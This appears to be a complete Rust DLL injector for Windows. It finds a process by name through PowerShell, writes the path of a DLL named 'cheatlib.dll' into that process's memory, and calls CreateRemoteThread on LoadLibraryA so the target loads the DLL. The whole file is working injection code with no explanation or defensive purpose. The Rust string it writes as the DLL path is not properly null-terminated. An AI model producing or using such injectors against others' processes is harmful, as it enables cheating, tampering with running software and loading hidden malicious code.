use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread };
use winapi::um::handleapi::CloseHandle;
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::winnt::{PROCESS_CREATE_THREAD, PROCESS_VM_WRITE, PROCESS_VM_OPERATION, MEM_COMMIT, PAGE_READWRITE};
use winapi::ctypes::c_void;


use std::process::Command;

fn main() {

    let process = "cmd";
    inject(process);
}

// Uses powershell to find 
fn get_process_id(process: &str) -> Option<(String, u32)>{

    let out_raw = {
        Command::new("powershell.exe")
            .args(&[format!("get-process | Where ProcessName -like \"{}*\" | foreach {{Write-Host \"$($_.ProcessName),$($_.id),$($_.Path)\"}}", process)])
            .output()
            .expect("Failed to execute command")
    };

    let out_str = std::str::from_utf8(&out_raw.stdout).expect("Failed to convert pid");

    for line in out_str.lines(){

        let out_split: Vec<&str> = line.split(",").collect();

        let exename: String = out_split[0].to_string();
        let pid:u32 = out_split[1].parse().expect("PID not a number");

        return Some((exename, pid))
    }
    None
}


fn inject(process: &str){

    let dll = "target/debug/cheatlib.dll";

    let res = get_process_id(process).expect("No process with that name active");
    println!("Process: {}, PID: {}", res.0, res.1);
  

    let loadlib_addr = unsafe {
        GetProcAddress(
        LoadLibraryA("kernelbase.dll\0".as_ptr() as *const i8),
        "LoadLibraryA\0".as_ptr() as *const i8) as *const i8
    };
    println!("LoadLibrary at: {:#X?}", loadlib_addr);


    let full_path = std::fs::canonicalize(dll).expect("DLL not found").to_str().unwrap().replace("\\\\?\\", "");
    let path_size = full_path.len() as usize + 1;
    println!("{:?}, Len: {}", full_path, path_size);

    let handle = unsafe{
        OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE |
        PROCESS_VM_OPERATION,
        0,
        res.1)
    };
    assert!(handle != std::ptr::null_mut(), "Handle is null");
    println!("Hande: {:?}", handle);

    let addr = unsafe{
        VirtualAllocEx(handle,
            std::ptr::null_mut(), 
            path_size, 
            MEM_COMMIT, 
            PAGE_READWRITE)};
    println!("Allocation Base: {:?}", addr);
    assert!(!addr.is_null(), "Allocation failed");
    
    let mut n = 0;

    unsafe {assert!(WriteProcessMemory(handle,
        addr,
        full_path.as_ptr() as *const c_void, 
        path_size, 
        &mut n) != 0, "Could not write to process") };

    println!("Wrote {} bytes", n);

    let thread = unsafe {
        CreateRemoteThread(handle,
            std::ptr::null_mut(), 
            0, 
            std::mem::transmute(loadlib_addr), 
            addr, 
            0, 
            std::ptr::null_mut())
    };

    println!("{:?}", thread);

    unsafe {assert!(CloseHandle(handle) != 0, "Handle failed to close sucessfully")};

}